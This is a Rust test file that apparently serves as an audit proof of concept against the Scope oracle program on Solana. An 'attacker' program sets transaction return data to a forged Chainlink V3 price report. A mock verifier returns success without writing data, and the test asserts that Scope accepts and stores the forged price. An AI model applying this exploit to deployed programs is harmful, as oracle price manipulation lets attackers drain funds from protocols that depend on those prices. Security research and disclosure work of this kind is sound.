use anchor_lang::prelude::*;
use anchor_lang::InstructionData;
use chainlink_streams_report::{
    feed_id::ID as FeedID,
    report::v3::ReportDataV3,
};
use num_bigint::BigInt;
use solana_program::{
    instruction::Instruction,
    program::{set_return_data},
    pubkey::Pubkey,
    system_instruction,
};
use solana_program_test::{processor, ProgramTest};
use solana_sdk::{
    account::Account,
    signature::{Keypair, Signer},
    transaction::Transaction,
};

// Reuse bytemuck via anchor to read zero-copy accounts off-chain
use anchor_lang::__private::bytemuck;

// Short alias to constants and helpers from the program
use scope::oracles::chainlink::chainlink_streams_itf::{
    get_config_pda, ACCESS_CONTROLLER_PUBKEY, VERIFIER_CONFIG_PUBKEY, VERIFIER_PROGRAM_ID,
};

// ------------------------------
// Mock Verifier program: returns success and writes NO return data
// ------------------------------
fn mock_verifier_process_instruction(
    _program_id: &Pubkey,
    _accounts: &[anchor_lang::prelude::AccountInfo],
    _instruction_data: &[u8],
) -> anchor_lang::prelude::ProgramResult {
    Ok(())
}

// ------------------------------
// Attacker program: simply sets the transaction return_data to the provided bytes
// ------------------------------
fn attacker_process_instruction(
    _program_id: &Pubkey,
    _accounts: &[anchor_lang::prelude::AccountInfo],
    instruction_data: &[u8],
) -> anchor_lang::prelude::ProgramResult {
    set_return_data(instruction_data);
    Ok(())
}

fn bigint_e18(value_int: u128) -> BigInt {
    let scale = BigInt::from(10u128).pow(18);
    BigInt::from(value_int) * scale
}

#[tokio::test]
async fn test_chainlink_return_data_confusion_v3() {
    // Program IDs
    let scope_pid = scope::id();
    let attacker_pid = Pubkey::new_unique();

    // Choose a report blob upfront to derive the verifier config PDA, then precreate required accounts
    let serialized_report_for_verifier = vec![1u8; 64];
    let config_account = get_config_pda(&serialized_report_for_verifier);

    // Program test environment with three programs: scope, mock verifier, attacker
    let mut pt = ProgramTest::new("scope", scope_pid, processor!(scope::entry));
    pt.add_program(
        "mock_verifier",
        VERIFIER_PROGRAM_ID,
        processor!(mock_verifier_process_instruction),
    );
    pt.add_program(
        "attacker",
        attacker_pid,
        processor!(attacker_process_instruction),
    );

    // Pre-create system-owned placeholder accounts expected by the instruction constraints
    for pk in [VERIFIER_CONFIG_PUBKEY, ACCESS_CONTROLLER_PUBKEY, config_account] {
        pt.add_account(
            pk,
            Account {
                lamports: 1_000_000,
                data: vec![],
                owner: solana_program::system_program::id(),
                executable: false,
                rent_epoch: 0,
            },
        );
    }

    // Start test context
    let mut ctx = pt.start_with_context().await;

    // Payer/admin
    let admin = &ctx.payer;

    // Pre-create zero-copy accounts owned by scope program
    // Sizes include Anchor's 8-byte discriminator
    const DISC: usize = 8;
    const ORACLE_MAPPING_SIZE: usize = scope::utils::consts::ORACLE_MAPPING_SIZE + DISC;
    const ORACLE_PRICES_SIZE: usize = scope::utils::consts::ORACLE_PRICES_SIZE + DISC;
    const ORACLE_TWAPS_SIZE: usize = scope::utils::consts::ORACLE_TWAPS_SIZE + DISC;
    const TOKEN_METADATA_SIZE: usize = scope::utils::consts::TOKEN_METADATA_SIZE + DISC;

    let oracle_mappings_kp = Keypair::new();
    let oracle_prices_kp = Keypair::new();
    let oracle_twaps_kp = Keypair::new();
    let token_metadatas_kp = Keypair::new();

    // Helper to create a zeroed account owned by scope
    async fn create_zero_account(
        ctx: &mut solana_program_test::ProgramTestContext,
        payer: &Keypair,
        kp: &Keypair,
        owner: &Pubkey,
        size: usize,
    ) {
        let rent = ctx.banks_client.get_rent().await.unwrap();
        let lamports = rent.minimum_balance(size);
        let ix = system_instruction::create_account(
            &payer.pubkey(),
            &kp.pubkey(),
            lamports,
            size as u64,
            owner,
        );
        let tx = Transaction::new_signed_with_payer(
            &[ix],
            Some(&payer.pubkey()),
            &[payer, kp],
            ctx.last_blockhash,
        );
        ctx.banks_client.process_transaction(tx).await.unwrap();
    }

    create_zero_account(&mut ctx, admin, &oracle_mappings_kp, &scope_pid, ORACLE_MAPPING_SIZE)
        .await;
    create_zero_account(&mut ctx, admin, &oracle_prices_kp, &scope_pid, ORACLE_PRICES_SIZE).await;
    create_zero_account(&mut ctx, admin, &oracle_twaps_kp, &scope_pid, ORACLE_TWAPS_SIZE).await;
    create_zero_account(&mut ctx, admin, &token_metadatas_kp, &scope_pid, TOKEN_METADATA_SIZE)
        .await;

    // Fixed verifier accounts already pre-created in the test harness

    // Prepare and send initialize instruction
    let feed_name = String::from("TEST_FEED");
    let init_accounts = scope::accounts::Initialize {
        admin: admin.pubkey(),
        system_program: solana_program::system_program::id(),
        configuration: scope::utils::pdas::config_pubkey(&feed_name).0,
        token_metadatas: token_metadatas_kp.pubkey(),
        oracle_twaps: oracle_twaps_kp.pubkey(),
        oracle_prices: oracle_prices_kp.pubkey(),
        oracle_mappings: oracle_mappings_kp.pubkey(),
    };
    let init_ix = Instruction {
        program_id: scope_pid,
        accounts: init_accounts.to_account_metas(None),
        data: scope::instruction::Initialize { feed_name: feed_name.clone() }.data(),
    };
    let init_tx = Transaction::new_signed_with_payer(
        &[init_ix],
        Some(&admin.pubkey()),
        &[admin],
        ctx.last_blockhash,
    );
    ctx.banks_client.process_transaction(init_tx).await.unwrap();

    // Create a dummy account that will serve as the Chainlink feed_id mapping target
    // Only the public key matters for validation
    let chainlink_feed_account = Keypair::new();
    let create_feed_ix = system_instruction::create_account(
        &admin.pubkey(),
        &chainlink_feed_account.pubkey(),
        1_000_000,
        0,
        &solana_program::system_program::id(),
    );
    let create_feed_tx = Transaction::new_signed_with_payer(
        &[create_feed_ix],
        Some(&admin.pubkey()),
        &[admin, &chainlink_feed_account],
        ctx.last_blockhash,
    );
    ctx.banks_client
        .process_transaction(create_feed_tx)
        .await
        .unwrap();

    // Configure mapping at index 0 as Chainlink v3 with confidence factor 50 (i.e., 2% bound)
    let mut generic = [0u8; 20];
    let confidence_factor: u32 = scope::utils::math::confidence_bps_to_factor(200);
    generic[..4].copy_from_slice(&confidence_factor.to_le_bytes());

    let config_pda = scope::utils::pdas::config_pubkey(&feed_name).0;
    let update_accounts = scope::accounts::UpdateOracleMapping {
        admin: admin.pubkey(),
        configuration: config_pda,
        oracle_mappings: oracle_mappings_kp.pubkey(),
        price_info: Some(chainlink_feed_account.pubkey()),
    };
    let update_ix = Instruction {
        program_id: scope_pid,
        accounts: update_accounts.to_account_metas(None),
        data: scope::instruction::UpdateMapping {
            token: 0u16,
            price_type: scope::oracles::OracleType::Chainlink as u8,
            twap_enabled: false,
            twap_source: 0u16,
            ref_price_index: u16::MAX,
            feed_name: feed_name.clone(),
            generic_data: generic,
        }
        .data(),
    };
    let update_tx = Transaction::new_signed_with_payer(
        &[update_ix],
        Some(&admin.pubkey()),
        &[admin],
        ctx.last_blockhash,
    );
    ctx.banks_client.process_transaction(update_tx).await.unwrap();

    // Forge a valid-looking Chainlink ReportDataV3 with chosen price and acceptable spread
    // Use observation timestamp slightly in the past to avoid min(now, ts) truncation
    let clock = ctx.banks_client.get_sysvar::<solana_program::clock::Clock>().await.unwrap();
    let obs_ts: u64 = (clock.unix_timestamp - 5).try_into().unwrap();

    let price_e18 = bigint_e18(100); // 100.0
    let bid_e18 = bigint_e18(99);    // 99.0
    let ask_e18 = bigint_e18(101);   // 101.0 => spread = 2.0 < 100/50 if we instead choose tighter; but 2*50==100 equals bound; pick 100.5/99.5
    let bid_e18 = bigint_e18(995) / BigInt::from(10u32); // 99.5
    let ask_e18 = bigint_e18(1005) / BigInt::from(10u32); // 100.5

    let forged_report = ReportDataV3 {
        feed_id: FeedID(chainlink_feed_account.pubkey().to_bytes()),
        observations_timestamp: obs_ts.into(),
        benchmark_price: price_e18,
        bid: bid_e18,
        ask: ask_e18,
    };
    let forged_bytes = forged_report.encode();

    // Attacker instruction: set transaction return_data to forged Chainlink bytes
    let attacker_ix = Instruction {
        program_id: attacker_pid,
        accounts: vec![],
        data: forged_bytes.clone(),
    };

    let refresh_accounts = scope::accounts::RefreshChainlinkPrice {
        user: admin.pubkey(),
        oracle_prices: oracle_prices_kp.pubkey(),
        oracle_mappings: oracle_mappings_kp.pubkey(),
        oracle_twaps: oracle_twaps_kp.pubkey(),
        verifier_account: VERIFIER_CONFIG_PUBKEY,
        access_controller: ACCESS_CONTROLLER_PUBKEY,
        config_account,
        verifier_program_id: VERIFIER_PROGRAM_ID,
    };
    let refresh_ix = Instruction {
        program_id: scope_pid,
        accounts: refresh_accounts.to_account_metas(None),
        data: scope::instruction::RefreshChainlinkPrice {
            token: 0u16,
            serialized_chainlink_report: serialized_report_for_verifier,
        }
        .data(),
    };

    // Execute the exploit: attacker sets return_data, then Scope refresh reads it and updates price
    let tx = Transaction::new_signed_with_payer(
        &[attacker_ix, refresh_ix],
        Some(&admin.pubkey()),
        &[admin],
        ctx.last_blockhash,
    );
    ctx.banks_client.process_transaction(tx).await.unwrap();

    // Read OraclePrices and assert the first entry was updated to non-zero with the forged timestamp
    let acct = ctx
        .banks_client
        .get_account(oracle_prices_kp.pubkey())
        .await
        .unwrap()
        .expect("oracle_prices account must exist");
    let data = acct.data;
    assert!(data.len() >= 8 + scope::utils::consts::ORACLE_PRICES_SIZE);
    let prices: &scope::OraclePrices = bytemuck::from_bytes(&data[8..8 + core::mem::size_of::<scope::OraclePrices>()]);

    let first = prices.prices[0];
    assert!(first.price.value > 0, "forged price should be non-zero");
    assert_eq!(first.unix_timestamp, obs_ts, "timestamp should match forged observations_timestamp");
}

